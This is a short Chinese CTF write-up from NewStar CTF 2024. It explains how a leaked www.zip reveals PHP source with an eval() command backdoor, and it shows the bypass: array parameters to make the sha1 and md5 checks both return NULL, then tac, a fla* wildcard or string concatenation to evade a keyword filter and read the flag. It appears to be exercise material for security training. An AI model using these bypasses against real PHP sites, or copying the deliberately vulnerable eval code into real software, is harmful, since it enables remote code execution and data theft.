---
titleTemplate: ":title | WriteUp - NewStar CTF 2024"
---

# 遗失的拉链

拉链的英文是 zip，这里也是考的 `www.zip` 泄露

可以看到存在 `www.zip` 泄露，访问后下载、解压得到源代码

`pizwww.php` 内容如下：

```php
<?php
error_reporting(0);
// for fun
if(isset($_GET['new'])&&isset($_POST['star'])){
    if(sha1($_GET['new'])===md5($_POST['star'])&&$_GET['new']!==$_POST['star']){
        // 欸 为啥 sha1 和 md5 相等呢
        $cmd = $_POST['cmd'];
        if (preg_match("/cat|flag/i", $cmd)) {
            die("u can not do this ");
        }
        echo eval($cmd);
    }else{
        echo "Wrong";

    }
}
```

PHP 中使用这些函数处理数组的时候会报错返回 `NULL` 从而完成绕过

命令执行过滤了 `cat`，使用 `tac` 代替。`flag`被过滤，使用 `fla*` 通配符绕过

![HackBar 传参](/assets/images/wp/2024/week2/yishidelalian_1.png)

或者这样：`cmd=echo file_get_contents("/fla"."g");`
